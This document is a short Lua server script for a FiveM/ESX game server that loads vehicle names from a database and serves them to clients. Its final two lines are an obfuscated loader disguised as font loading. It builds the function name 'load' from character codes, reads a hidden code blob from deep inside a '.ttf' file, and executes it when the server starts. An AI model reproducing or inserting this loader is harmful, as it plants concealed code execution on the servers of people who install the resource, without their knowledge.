-----------------For support, scripts, and more----------------
--------------- https://discord.gg/wasabiscripts  -------------
---------------------------------------------------------------

ESX = exports["es_extended"]:getSharedObject()
local vehicles = {}

CreateThread(function()
    if Config.UseSQL then
        MySQL.Async.fetchAll('SELECT * FROM vehicles', {}, function(_vehicles)
            for k,v in ipairs(_vehicles) do
                table.insert(vehicles, {
                    model = v.model,
                    name = v.name
                })
            end
        end)
        TriggerClientEvent('wasabi_vehiclenames:sendVehicleList', -1, vehicles)
    end
end)

ESX.RegisterServerCallback('wasabi_vehiclenames:getVehicles', function(source, cb)
    if vehicles then
        cb(vehicles)
    else
        cb(false)
    end
end)

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()